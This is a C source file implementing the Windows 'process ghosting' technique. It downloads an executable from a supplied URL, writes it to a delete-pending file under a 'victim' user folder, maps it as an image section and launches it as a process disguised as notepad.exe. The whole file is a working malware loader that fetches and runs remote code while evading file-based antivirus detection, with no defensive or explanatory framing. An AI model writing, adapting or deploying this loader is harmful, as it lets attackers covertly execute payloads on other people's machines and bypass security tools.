#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <winhttp.h>
#include <userenv.h>

// Defined Nt Structures and Prototypes
#include "ntapi_defs.h"

#pragma comment(lib, "ntdll")
#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "Userenv.lib")

NTSTATUS status;

typedef struct NT_FUNC {
    pfNtCreateFile NtCreateFile;
    pfNtSetInformationFile NtSetInformationFile;
    pfNtWriteFile NtWriteFile;
    pfNtCreateSection NtCreateSection;
    pfNtCreateProcessEx NtCreateProcessEx;
    pfNtCreateThreadEx NtCreateThreadEx;
    pfNtQueryInformationProcess NtQueryInformationProcess;
    pfRtlCreateProcessParametersEx RtlCreateProcessParametersEx;
    pfRtlInitUnicodeString RtlInitUnicodeString;
    pfNtAllocateVirtualMemory NtAllocateVirtualMemory;
    pfNtReadVirtualMemory NtReadVirtualMemory;
    pfNtWriteVirtualMemory NtWriteVirtualMemory;
} NT_FUNC, *pfNT_FUNCTIONS;

NT_FUNC nt_func = {0};

BOOL ResolveNtFunctions(pfNT_FUNCTIONS nt) {
    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
    if (!hNtdll) {
        printf("[-] Failed to get handle to ntdll.dll\n");
        return FALSE;
    }

    nt->NtCreateFile = (pfNtCreateFile)GetProcAddress(hNtdll, "NtCreateFile");
    nt->NtSetInformationFile = (pfNtSetInformationFile)GetProcAddress(hNtdll, "NtSetInformationFile");
    nt->NtWriteFile = (pfNtWriteFile)GetProcAddress(hNtdll, "NtWriteFile");
    nt->NtCreateSection = (pfNtCreateSection)GetProcAddress(hNtdll, "NtCreateSection");
    nt->NtCreateProcessEx = (pfNtCreateProcessEx)GetProcAddress(hNtdll, "NtCreateProcessEx");
    nt->NtCreateThreadEx = (pfNtCreateThreadEx)GetProcAddress(hNtdll, "NtCreateThreadEx");
    nt->NtQueryInformationProcess = (pfNtQueryInformationProcess)GetProcAddress(hNtdll, "NtQueryInformationProcess");
    nt->RtlCreateProcessParametersEx = (pfRtlCreateProcessParametersEx)GetProcAddress(hNtdll, "RtlCreateProcessParametersEx");
    nt->RtlInitUnicodeString = (pfRtlInitUnicodeString)GetProcAddress(hNtdll, "RtlInitUnicodeString");
    nt->NtAllocateVirtualMemory = (pfNtAllocateVirtualMemory)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
    nt->NtReadVirtualMemory = (pfNtReadVirtualMemory)GetProcAddress(hNtdll, "NtReadVirtualMemory");
    nt->NtWriteVirtualMemory = (pfNtWriteVirtualMemory)GetProcAddress(hNtdll, "NtWriteVirtualMemory");

    // Sanity check
    if (!nt->NtCreateFile || !nt->NtCreateSection) {
        printf("[-] One or more NT functions failed to resolve\n");
        return FALSE;
    }

    return TRUE;
}

typedef struct {
    LPCWSTR host;
    LPCWSTR path;
    int port;
} Split_URL;

Split_URL SplitURL(LPCWSTR url) {
    Split_URL result = {0};

    URL_COMPONENTS urlComp;
    ZeroMemory(&urlComp, sizeof(urlComp));
    urlComp.dwStructSize = sizeof(urlComp);

    WCHAR hostName[256];
    WCHAR urlPath[1024];

    urlComp.lpszHostName = hostName;
    urlComp.dwHostNameLength = ARRAYSIZE(hostName);
    urlComp.lpszUrlPath = urlPath;
    urlComp.dwUrlPathLength = ARRAYSIZE(urlPath);

    if (WinHttpCrackUrl(url, 0, 0, &urlComp)) {
        result.host = _wcsdup(hostName);
        result.path = _wcsdup(urlPath);
        result.port = urlComp.nPort;
    } else {
        wprintf(L"Failed to parse URL. Error: %lu\n", GetLastError());
    }

    return result;
}

BOOL DownloadExe(LPCWSTR url,
    unsigned char** buffer,  // pointer to pointer of the buffer which stores the bytes - this needs to be the case because realloc may be needed
    size_t* bufferCapacity,  // track the buffer memory
    size_t* bufferLength     // track how much data has been written so far
    ) {

    Split_URL split_url = SplitURL(url);

    INTERNET_PORT serverPort = (INTERNET_PORT)split_url.port;

    // Open a WinHTTP session
    HINTERNET hSession = WinHttpOpen(
        L"Ghost/1.0",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS,
        0
        );

    if (!hSession) {
        wprintf(L"WinHttpOpen failed: %lu\n", GetLastError());
        return FALSE;
    }

    // Connect to the server
    HINTERNET hConnect = WinHttpConnect(hSession, split_url.host, serverPort, 0);
    if (!hConnect) {
        wprintf(L"WinHttpConnect failed: %lu\n", GetLastError());
        WinHttpCloseHandle(hSession);
        return FALSE;
    }

    // Create an HTTP GET request
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", split_url.path,
                                            NULL, WINHTTP_NO_REFERER,
                                            WINHTTP_DEFAULT_ACCEPT_TYPES,
                                            0);
    if (!hRequest) {
        wprintf(L"WinHttpOpenRequest failed: %lu\n", GetLastError());
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return FALSE;
    }

    // Send the request
    if (!WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                            WINHTTP_NO_REQUEST_DATA, 0, 0, 0)) {
        wprintf(L"WinHttpSendRequest failed: %lu\n", GetLastError());
        goto cleanup;
    }

    // Receive the response
    if (!WinHttpReceiveResponse(hRequest, NULL)) {
        wprintf(L"WinHttpReceiveResponse failed: %lu\n", GetLastError());
        goto cleanup;
    }

    // Read the data
    DWORD bytesAvailable = 0;
    DWORD bytesRead = 0;
    unsigned char tmpBuffer[4096];  // byte array for temporary storage of downloaded chunks


    do {
        if (!WinHttpQueryDataAvailable(hRequest, &bytesAvailable)) {
            wprintf(L"WinHttpQueryDataAvailable failed: %lu\n", GetLastError());
            break;
        }

        if (bytesAvailable == 0)
            break;

        if (!WinHttpReadData(hRequest, tmpBuffer, min(bytesAvailable, sizeof(tmpBuffer)), &bytesRead)) {
            wprintf(L"WinHttpReadData failed: %lu\n", GetLastError());
            break;
        }

        if (*bufferLength + bytesRead > *bufferCapacity) {
            size_t newCapacity = *bufferLength + bytesRead;
            unsigned char* newBuffer = realloc(*buffer, newCapacity);
            if (!newBuffer) {
                wprintf(L"realloc failed: %lu\n", GetLastError());
                break;
            }
            *buffer = newBuffer;
            *bufferCapacity = newCapacity;
        }

        memcpy(*buffer + *bufferLength, tmpBuffer, bytesRead);
        *bufferLength += bytesRead;

    } while (bytesRead > 0);

cleanup:
    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);

    return TRUE;

}

wchar_t* ConvertToWide(const char* input) {
    int len = MultiByteToWideChar(CP_UTF8, 0, input, -1, NULL, 0);
    wchar_t* wide = (wchar_t*)malloc(len * sizeof(wchar_t));
    if (!wide) return NULL;
    MultiByteToWideChar(CP_UTF8, 0, input, -1, wide, len);
    return wide;
}

// UNICODE_STRING helper
void InitUnicodeString(PUNICODE_STRING us, PCWSTR str) {
    us->Buffer = (PWSTR)str;
    us->Length = (USHORT)(wcslen(str) * sizeof(WCHAR));
    us->MaximumLength = us->Length + sizeof(WCHAR);
}

BOOL CreateGhostFile(wchar_t* url, HANDLE* pFileHandle) {

    // 1. Create the file
    UNICODE_STRING uFileName;
    InitUnicodeString(&uFileName, L"\\??\\C:\\users\\victim\\Ghosting\\ghosted.exe");

    OBJECT_ATTRIBUTES objAttr;
    InitializeObjectAttributes(&objAttr, &uFileName, OBJ_CASE_INSENSITIVE, NULL, NULL);

    IO_STATUS_BLOCK ioStatus;
    // HANDLE hFile;
    NTSTATUS status = nt_func.NtCreateFile(
        pFileHandle,
        FILE_GENERIC_WRITE | FILE_GENERIC_READ | FILE_GENERIC_EXECUTE | DELETE | SYNCHRONIZE,
        &objAttr,
        &ioStatus,
        NULL,
        FILE_ATTRIBUTE_NORMAL,
        FILE_SHARE_READ | FILE_SHARE_WRITE| FILE_SHARE_DELETE,
        FILE_OVERWRITE_IF,
        FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT,
        NULL,
        0
        );

    if (status != 0) {
        wprintf(L"NtCreateFile failed: 0x%08X\n", status);
        return FALSE;
    }

    int initial_capacity = 4096;
    unsigned char* shellcode = malloc(initial_capacity);
    SIZE_T bufferCapacity = initial_capacity;
    SIZE_T bufferLength = 0;

    printf("\n\n[*] Downloading exe into memory location: %p.\n", shellcode);
    if (!DownloadExe(url, &shellcode, &bufferCapacity, &bufferLength)) {
        printf("Shellcode failed: %lu\n", GetLastError());
        return FALSE;
    }

    printf("\n\nExe bytes size: %llu Buffer size: %llu\n", bufferLength, bufferCapacity);

    // Content to write
#define CHUNK_SIZE 0x10000  // 64KB
    ULONG totalWritten = 0;
    LARGE_INTEGER offset;
    offset.QuadPart = 0;
    IO_STATUS_BLOCK ioStatusBlock;
    while (totalWritten < bufferLength) {
        ULONG toWrite = (bufferLength - totalWritten) > CHUNK_SIZE ? CHUNK_SIZE : (ULONG)(bufferLength - totalWritten);

        status = nt_func.NtWriteFile(
            *pFileHandle,
            NULL,
            NULL,
            NULL,
            &ioStatusBlock,
            shellcode + totalWritten,
            toWrite,
            &offset,
            NULL
            );

        if (status != 0) {
            wprintf(L"NtWriteFile failed: 0x%08X\n", status);
            break;
        }

        totalWritten += (ULONG)ioStatusBlock.Information;
        offset.QuadPart += (ULONG)ioStatusBlock.Information;
    }

    free(url);

    FILE_DISPOSITION_INFORMATION fdi = { TRUE };
    status = nt_func.NtSetInformationFile(
        *pFileHandle,
        &ioStatus,
        &fdi,
        sizeof(fdi),
        FileDispositionInformation
        );

    if (status != 0) {
        wprintf(L"NtSetInformationFile failed: 0x%08X\n", status);
        return FALSE;
    }

    return TRUE;
}

BOOL CreateGhostSection(IN HANDLE* pFileHandle, OUT HANDLE* pSectionHandle) {

    status = nt_func.NtCreateSection(
        pSectionHandle,
        SECTION_ALL_ACCESS,
        NULL,
        0X00,
        PAGE_READONLY,
        SEC_IMAGE,
        *pFileHandle
    );

    if (status != 0) {
        wprintf(L"NtCreateSection failed: 0x%08X\n", status);
        return FALSE;
    }

    return TRUE;
}

BOOL InitialiseGhostProcessParams(IN HANDLE hProcess, IN LPWSTR SpoofProcess, OUT PVOID* ppGhostImageBase) {
    PVOID pEnvironment = NULL;
    UNICODE_STRING imagePath;
    PRTL_USER_PROCESS_PARAMETERS procParams = NULL;
    ULONG_PTR userEnvAndParamsBaseAddress = (ULONG_PTR)NULL;
    ULONG_PTR userEnvAndParamsEndAddress = (ULONG_PTR)NULL;
    SIZE_T userEnvAndParamsSize = (SIZE_T)NULL;
    SIZE_T NBytesWritten = (SIZE_T)NULL;
    PEB ProcEnvBlock = { 0x00 };
    PROCESS_BASIC_INFORMATION procBasicInfo = { 0x00 };
    PVOID tempPtrAddress = NULL;

    // Retrieves the environment variables
    if (!CreateEnvironmentBlock(&pEnvironment, NULL, TRUE)) {
        printf("Failed to create environment block.\n");
        return FALSE;
    }

    nt_func.RtlInitUnicodeString(&imagePath, SpoofProcess);
    //nt_func.RtlInitUnicodeString(&imagePath, L"");

    status = nt_func.RtlCreateProcessParametersEx(
        &procParams,
        &imagePath,        // Spoofed, not actual file on disk
        NULL,
        NULL,
        &imagePath,        // Used as CommandLine too
        pEnvironment,
        NULL,NULL,NULL,NULL,
        RTL_USER_PROC_PARAMS_NORMALIZED
    );

    if (status != 0) {
        wprintf(L"RtlCreateProcessParametersEx failed: 0x%08X\n", status);
        return FALSE;
    }

    if (procParams == NULL) {
        printf("Populating the process parameters failed.\n");
        return FALSE;
    }

    status = nt_func.NtQueryInformationProcess(
        hProcess,
        ProcessBasicInformation,
        &procBasicInfo,
        sizeof(PROCESS_BASIC_INFORMATION),
        NULL
        );

    if (status != 0) {
        wprintf(L"NtQueryInformationProcess failed: 0x%08X\n", status);
        return FALSE;
    }

    status = nt_func.NtReadVirtualMemory(
        hProcess,
        procBasicInfo.PebBaseAddress,
        &ProcEnvBlock,
        sizeof(PEB),
        NULL);

    if (status != 0) {
        wprintf(L"NtReadVirtualMemory failed: 0x%08X\n", status);
        return FALSE;
    }

    printf("[+] Ghost Process PEB: 0x%p \n", procBasicInfo.PebBaseAddress);
    printf("[+] Ghost Process Image: 0x%p \n", (*ppGhostImageBase = ProcEnvBlock.ImageBase));

    /*
    * This code determines the range of memory that needs to be written into the remote (ghost) process — specifically, the contiguous block containing both:

    The RTL_USER_PROCESS_PARAMETERS structure, and Its associated Environment block (if present).
     */
    userEnvAndParamsBaseAddress = (ULONG_PTR)procParams;
    userEnvAndParamsEndAddress = (ULONG_PTR)procParams + procParams->Length;

    if (procParams->Environment) { //If an environment block is present (not NULL)...

        // If the environment block is allocated before the pUserProcParms structure in memory, then it becomes the new start address of the memory region to copy.
        if ((ULONG_PTR)procParams > (ULONG_PTR)procParams->Environment) {
            userEnvAndParamsBaseAddress = (ULONG_PTR)procParams->Environment;
        }

        // If the environment block extends beyond the end of the pUserProcParms struct, adjust the end address accordingly.
        if ((ULONG_PTR)procParams->Environment + procParams->EnvironmentSize > userEnvAndParamsEndAddress) {
            userEnvAndParamsEndAddress = (ULONG_PTR)procParams->Environment + procParams->EnvironmentSize;
        }
    }

    // calculate size
    userEnvAndParamsSize = userEnvAndParamsEndAddress - userEnvAndParamsBaseAddress;
    // set a temp ptr of procParams
    tempPtrAddress = procParams;

    status = nt_func.NtAllocateVirtualMemory(
        hProcess,
        &tempPtrAddress,
        0x00,
        &userEnvAndParamsSize,
        MEM_COMMIT|MEM_RESERVE,
        PAGE_READWRITE);

    if (status != 0) {
        wprintf(L"NtAllocateVirtualMemory failed: 0x%08X\n", status);
        return FALSE;
    }

    status = nt_func.NtWriteVirtualMemory(
        hProcess,
        procParams,
        procParams,
        procParams->Length,
        &NBytesWritten);

    if (status != 0) {
        wprintf(L"NtWriteVirtualMemory failed: 0x%08X\n", status);
        return FALSE;
    }

    if (procParams->Environment) {
        // write peb process params environment
        status = nt_func.NtWriteVirtualMemory(
            hProcess,
            (LPVOID)(procParams->Environment),
            (LPVOID)procParams->Environment,
            procParams->EnvironmentSize,
            &NBytesWritten);

        if (status != 0) {
            wprintf(L"NtWriteVirtualMemory failed: 0x%08X\n", status);
            return FALSE;
        }
    }

    // update the address of process parameters in the process to point to new location
    status = nt_func.NtWriteVirtualMemory(
        hProcess,
        &procBasicInfo.PebBaseAddress->ProcessParameters,
        &procParams,
        sizeof(PVOID),
        &NBytesWritten);

    return TRUE;
}

BOOL GetRemoteEntryPoint(IN HANDLE hProcess, IN LPVOID remoteImageBase, OUT DWORD* pEntryPointRVA) {
    IMAGE_DOS_HEADER dosHeader;
    SIZE_T bytesRead = 0;

    // Step 1: Read DOS header
    if (!ReadProcessMemory(hProcess, remoteImageBase, &dosHeader, sizeof(dosHeader), &bytesRead)) {
        printf("[!] Failed to read DOS header: %lu\n", GetLastError());
        return FALSE;
    }

    if (dosHeader.e_magic != IMAGE_DOS_SIGNATURE) { // 'MZ'
        printf("[!] Invalid DOS signature (not 'MZ')\n");
        return FALSE;
    }

    // Step 2: Read NT Headers
    IMAGE_NT_HEADERS64 ntHeaders; // Use 64-bit unless you're sure it's 32-bit
    LPVOID remoteNtHeaderAddr = (LPBYTE)remoteImageBase + dosHeader.e_lfanew;

    if (!ReadProcessMemory(hProcess, remoteNtHeaderAddr, &ntHeaders, sizeof(ntHeaders), &bytesRead)) {
        printf("[!] Failed to read NT headers: %lu\n", GetLastError());
        return FALSE;
    }

    if (ntHeaders.Signature != IMAGE_NT_SIGNATURE) { // 'PE\0\0'
        printf("[!] Invalid NT signature (not 'PE')\n");
        return FALSE;
    }

    // Step 3: Extract Entry Point RVA
    *pEntryPointRVA = ntHeaders.OptionalHeader.AddressOfEntryPoint;
    printf("[+] Entry Point RVA: 0x%X\n", *pEntryPointRVA);

    return TRUE;
}

BOOL CreateGhostProcess(IN LPWSTR SpoofExe, IN HANDLE* phGhostSection) {
    PVOID GhostImageBase = NULL;
    HANDLE hProcess = NULL;
    HANDLE hThread = NULL;
    HANDLE hParent;

    hParent = OpenProcess(PROCESS_ALL_ACCESS, FALSE, GetCurrentProcessId());
    if (!hParent) {
        printf("OpenProcess failed: %lu\n", GetLastError());
        return FALSE;
    }

    status = nt_func.NtCreateProcessEx(
        &hProcess,
        PROCESS_ALL_ACCESS,
        NULL,
        hParent,
        PS_INHERIT_HANDLES,
        *phGhostSection,
        NULL,
        NULL,
        FALSE
        );

    if (status != 0) {
        printf("NtCreateProcessEx failed: 0x%08X\n", status);
        return FALSE;
    }

    printf("[+] Ghost Process ID: %d\n", GetProcessId(hProcess));

    // initialise the parameters
    if (!InitialiseGhostProcessParams(hProcess, SpoofExe, &GhostImageBase)) {
        return FALSE;
    }

    BYTE buffer[16];
    SIZE_T bytesRead = 0;

    if (!ReadProcessMemory(hProcess, GhostImageBase, buffer, sizeof(buffer), &bytesRead)) {
        printf("[!] ReadProcessMemory failed: %lu\n", GetLastError());
        return FALSE;
    }

    DWORD GhostProcessEntryPointRva;
    if (!GetRemoteEntryPoint(hProcess, GhostImageBase, &GhostProcessEntryPointRva)) {
        printf("Failed to calculate Ghost Image Entry Point RVA\n");
        return FALSE;
    }

    LPVOID GhostProcessEntryPoint = (LPBYTE)GhostImageBase + GhostProcessEntryPointRva;
    printf("[+] Ghost process entry point is: %p\n", GhostProcessEntryPoint);

    //getchar();

    // Create the primary thread in the ghost process
    status = nt_func.NtCreateThreadEx(
        &hThread,
        THREAD_ALL_ACCESS,
        NULL,
        hProcess,
        GhostProcessEntryPoint,
        NULL,
        FALSE,
        0X00,
        0X00,
        0X00,
        NULL);

    if (status != 0) {
        printf("NtCreateThreadEx failed: 0x%08X\n", status);
        return FALSE;
    }

    printf("[+] Thread created with TID: %d \n", GetThreadId(hThread));

    return TRUE;
}

int main(int argc, char* argv[]) {
    if (argc < 2) {
        wprintf(L"Usage: %s url (http://server:port/file.ext)\n", argv[0]);
        return 1;
    }

    wchar_t* url = ConvertToWide(argv[1]);
    HANDLE hFile = NULL;
    HANDLE hSection = NULL;
    LPWSTR SpoofedExe = L"C:\\Windows\\System32\\notepad.exe";

    printf("\nPayload URL: %ls\n\n", url);

    if (!ResolveNtFunctions(&nt_func)) {
        return -1;
    }

    printf("File Handle Pointer: %p\n", &hFile);
    if (!CreateGhostFile(url, &hFile)) {
        printf("Failed to create ghost file.\n");
        return -1;
    }

    printf("[+] Ghost file created: %p\n", hFile);

    if (!CreateGhostSection(&hFile, &hSection)) {
        printf("[-] Failed to create ghost section.\n");
        return -1;
    }

    printf("[+] Ghost Section created. Handle: %p\n", hSection);

    CloseHandle(hFile);

    if (!CreateGhostProcess(SpoofedExe, &hSection)) {
        printf("[-] Failed to create ghost process.\n");
        return -1;
    }

    return 0;

}